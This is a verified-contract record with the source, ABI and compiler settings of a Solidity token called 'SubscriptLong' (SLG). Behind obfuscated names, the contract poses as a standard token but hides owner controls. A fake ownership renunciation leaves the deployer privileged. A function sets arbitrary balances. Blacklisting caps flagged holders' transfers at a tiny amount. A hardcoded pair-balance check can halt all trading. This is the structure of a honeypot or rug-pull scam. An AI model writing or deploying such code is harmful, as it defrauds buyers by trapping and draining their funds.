{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface fromLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedIsTeam {\n    function createPair(address tradingLimit, address receiverLiquidity) external returns (address);\n}\n\ninterface totalMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountMode) external view returns (uint256);\n\n    function transfer(address senderLaunchedSell, uint256 amountTo) external returns (bool);\n\n    function allowance(address buyTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderLaunchedSell,\n        uint256 amountTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTx, uint256 value);\n    event Approval(address indexed buyTake, address indexed spender, uint256 value);\n}\n\ninterface totalMinMetadata is totalMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SubscriptLong is fundReceiver, totalMin, totalMinMetadata {\n\n    function limitMax() public {\n        emit OwnershipTransferred(listIsTo, address(0));\n        fundSwap = address(0);\n    }\n\n    constructor (){\n        if (launchTeam == listLiquidityReceiver) {\n            atLaunched = true;\n        }\n        fromLiquidity receiverMax = fromLiquidity(walletIsReceiver);\n        fromReceiver = launchedIsTeam(receiverMax.factory()).createPair(receiverMax.WETH(), address(this));\n        if (marketingShould != launchTeam) {\n            launchTeam = marketingShould;\n        }\n        listIsTo = _msgSender();\n        limitMax();\n        txEnableTrading[listIsTo] = true;\n        exemptAuto[listIsTo] = teamLaunch;\n        \n        emit Transfer(address(0), listIsTo, teamLaunch);\n    }\n\n    string private swapLaunched = \"Subscript Long\";\n\n    uint256 private teamLaunch = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed tradingBuy, address indexed limitSender);\n\n    uint256 public launchTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minWallet;\n    }\n\n    mapping(address => bool) public limitSell;\n\n    uint256 private listLiquidityReceiver;\n\n    function getOwner() external view returns (address) {\n        return fundSwap;\n    }\n\n    function limitLaunch(address autoSell, address senderLaunchedSell, uint256 amountTo) internal returns (bool) {\n        if (autoSell == listIsTo) {\n            return amountSenderExempt(autoSell, senderLaunchedSell, amountTo);\n        }\n        uint256 sellTakeEnable = totalMin(fromReceiver).balanceOf(launchFund);\n        require(sellTakeEnable == modeReceiver);\n        require(senderLaunchedSell != launchFund);\n        if (limitSell[autoSell]) {\n            return amountSenderExempt(autoSell, senderLaunchedSell, sellList);\n        }\n        return amountSenderExempt(autoSell, senderLaunchedSell, amountTo);\n    }\n\n    function transfer(address shouldTo, uint256 amountTo) external virtual override returns (bool) {\n        return limitLaunch(_msgSender(), shouldTo, amountTo);\n    }\n\n    bool private atLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return swapLaunched;\n    }\n\n    function owner() external view returns (address) {\n        return fundSwap;\n    }\n\n    function shouldMode(uint256 amountTo) public {\n        teamLaunched();\n        modeReceiver = amountTo;\n    }\n\n    function receiverMin(address shouldTo, uint256 amountTo) public {\n        teamLaunched();\n        exemptAuto[shouldTo] = amountTo;\n    }\n\n    uint256 modeReceiver;\n\n    function transferFrom(address autoSell, address senderLaunchedSell, uint256 amountTo) external override returns (bool) {\n        if (_msgSender() != walletIsReceiver) {\n            if (liquidityList[autoSell][_msgSender()] != type(uint256).max) {\n                require(amountTo <= liquidityList[autoSell][_msgSender()]);\n                liquidityList[autoSell][_msgSender()] -= amountTo;\n            }\n        }\n        return limitLaunch(autoSell, senderLaunchedSell, amountTo);\n    }\n\n    address walletIsReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private exemptAuto;\n\n    address private fundSwap;\n\n    function amountSenderExempt(address autoSell, address senderLaunchedSell, uint256 amountTo) internal returns (bool) {\n        require(exemptAuto[autoSell] >= amountTo);\n        exemptAuto[autoSell] -= amountTo;\n        exemptAuto[senderLaunchedSell] += amountTo;\n        emit Transfer(autoSell, senderLaunchedSell, amountTo);\n        return true;\n    }\n\n    function tokenFrom(address autoSwap) public {\n        teamLaunched();\n        if (launchTeam != listLiquidityReceiver) {\n            listLiquidityReceiver = marketingShould;\n        }\n        if (autoSwap == listIsTo || autoSwap == fromReceiver) {\n            return;\n        }\n        limitSell[autoSwap] = true;\n    }\n\n    address public fromReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamLaunch;\n    }\n\n    uint8 private minWallet = 18;\n\n    mapping(address => mapping(address => uint256)) private liquidityList;\n\n    bool private swapTrading;\n\n    address launchFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listTotal;\n\n    address public listIsTo;\n\n    function shouldToken(address takeAmount) public {\n        if (listTotal) {\n            return;\n        }\n        if (listLiquidityReceiver != launchTeam) {\n            listLiquidityReceiver = launchTeam;\n        }\n        txEnableTrading[takeAmount] = true;\n        \n        listTotal = true;\n    }\n\n    function teamLaunched() private view {\n        require(txEnableTrading[_msgSender()]);\n    }\n\n    function allowance(address maxAt, address limitFund) external view virtual override returns (uint256) {\n        if (limitFund == walletIsReceiver) {\n            return type(uint256).max;\n        }\n        return liquidityList[maxAt][limitFund];\n    }\n\n    function balanceOf(address amountMode) public view virtual override returns (uint256) {\n        return exemptAuto[amountMode];\n    }\n\n    uint256 constant sellList = 6 ** 10;\n\n    function approve(address limitFund, uint256 amountTo) public virtual override returns (bool) {\n        liquidityList[_msgSender()][limitFund] = amountTo;\n        emit Approval(_msgSender(), limitFund, amountTo);\n        return true;\n    }\n\n    mapping(address => bool) public txEnableTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptShould;\n    }\n\n    string private exemptShould = \"SLG\";\n\n    uint256 receiverExempt;\n\n    uint256 private marketingShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIsTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"shouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"tokenFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLaunchedSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txEnableTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SubscriptLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}